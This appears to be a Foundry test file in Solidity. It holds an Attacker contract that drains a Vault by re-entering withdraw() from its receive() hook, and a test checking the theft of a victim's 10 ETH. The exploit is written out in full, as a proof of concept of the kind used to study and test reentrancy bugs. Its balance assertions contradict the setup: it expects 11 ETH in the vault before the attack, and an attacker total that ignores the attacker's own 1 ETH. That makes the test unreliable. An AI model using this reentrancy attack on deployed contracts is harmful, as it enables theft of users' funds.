// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// Malicious contract that re-enters withdraw() from its receive() hook.
contract Attacker {
    Vault public vault;
    uint256 public constant STEP = 1 ether;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        // First withdraw: balanceOf[attacker] is already STEP, and is NOT zeroed
        // during the transfer, so every re-entry sees the same STEP again.
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= STEP) {
            vault.withdraw();
        }
    }
}

contract ReentrancyDrainTest is Test {
    Vault vault;
    Attacker attacker;
    address victim = address(0xBEEF);

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(vault);

        // Honest victim deposits 10 ETH.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Attacker only has 1 ETH.
        vm.deal(address(attacker), 1 ether);
    }

    function testDrainVaultByReentrancy() public {
        assertEq(address(vault).balance, 11 ether);

        attacker.attack{value: 1 ether}();

        // Attacker put in 1 ETH and walked away with the whole vault.
        assertEq(address(attacker).balance, 11 ether, "attacker did not drain vault");
        assertEq(address(vault).balance, 0, "vault not empty");
        assertEq(vault.balanceOf(address(attacker)), 0, "attacker ledger not reset");
        assertEq(vault.balanceOf(victim), 10 ether, "victim ledger untouched");
    }
}

